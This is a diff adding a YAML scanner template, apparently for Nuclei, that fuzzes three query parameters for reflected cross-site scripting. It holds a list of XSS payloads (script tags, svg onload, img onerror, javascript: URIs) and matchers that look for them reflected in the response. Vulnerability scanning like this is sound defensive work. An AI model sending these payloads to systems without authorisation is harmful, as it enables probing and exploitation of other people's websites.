@@ -1,0 +1,37 @@
+id: xss-fuzz
+
+info:
+  name: Reflected XSS Fuzz
+  author: ExoShade
+  severity: high
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?q={{payload}}"
+      - "{{BaseURL}}/?search={{payload}}"
+      - "{{BaseURL}}/?id={{payload}}"
+
+    payloads:
+      payload:
+        - "<script>alert(1)</script>"
+        - "\"><script>alert(1)</script>"
+        - "<svg onload=alert(1)>"
+        - "javascript:alert(1)"
+        - "'\"><img src=x onerror=alert(1)>"
+        - "'';!--\"<XSS>=&{()}"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "<script>alert(1)</script>"
+          - "onload=alert(1)"
+          - "onerror=alert(1)"
+          - "<XSS>"
+        condition: or
